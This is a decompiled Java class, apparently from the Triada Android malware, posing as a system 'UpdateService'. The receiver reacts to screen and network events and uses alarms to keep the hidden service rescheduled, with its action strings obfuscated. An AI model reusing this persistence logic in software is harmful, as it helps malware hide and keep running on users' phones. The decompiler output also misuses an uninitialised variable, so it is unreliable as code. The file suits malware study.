package com.android.jservice;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import com.a.a.a.b;

final class a extends BroadcastReceiver {
  private a(UpdateService paramUpdateService) {}
  
  public final void onReceive(Context paramContext, Intent paramIntent) {
    UpdateService updateService;
    if (paramIntent.getAction().equals(b.an)) {
      UpdateService.a(false);
      if (UpdateService.b())
        UpdateService.b.sendMessageDelayed(UpdateService.b.obtainMessage(8), 100L); 
      return;
    } 
    if (paramIntent.getAction().equals(b.am)) {
      UpdateService.a(true);
      UpdateService.a(this.a);
      if (System.currentTimeMillis() - UpdateService.b(this.a) > 1799998L)
        UpdateService.b.sendEmptyMessage(5); 
      return;
    } 
    if (paramIntent.getAction().equals(b.ao)) {
      if (!UpdateService.b() && com.a.a.b.a.a(paramContext) && com.a.a.b.a.a) {
        UpdateService.a(this.a);
        if (System.currentTimeMillis() - UpdateService.b(this.a) > 1799998L)
          UpdateService.b.sendEmptyMessage(5); 
      } 
      if (UpdateService.b() && UpdateService.c(this.a) != 0) {
        updateService = this.a;
        UpdateService.a(updateService, UpdateService.c(updateService) + 1);
        if (UpdateService.c(this.a) >= 2 && com.a.a.b.a.a(paramContext))
          try {
            UpdateService.a(this.a, 0);
            SystemClock.sleep(5000L);
            UpdateService.d(this.a);
          } catch (Exception exception) {} 
      } 
      return;
    } 
    if (updateService.getAction().equals(UpdateService.c)) {
      switch (getResultCode()) {
        default:
          UpdateService.a(this.a, UpdateService.b, (Context)this.a);
          return;
        case -1:
          break;
      } 
      if (UpdateService.e(this.a).size() > 0) {
        AlarmManager alarmManager = (AlarmManager)this.a.getSystemService(b.aj);
        Intent intent = new Intent((Context)this.a, UpdateService.class);
        intent.setAction(b.o);
        PendingIntent pendingIntent = PendingIntent.getService((Context)this.a, 0, intent, 268435456);
        alarmManager.set(0, System.currentTimeMillis() + 60000L, pendingIntent);
        return;
      } 
      UpdateService.a(this.a, UpdateService.b, (Context)this.a);
      UpdateService.e(this.a).clear();
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/jservice/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */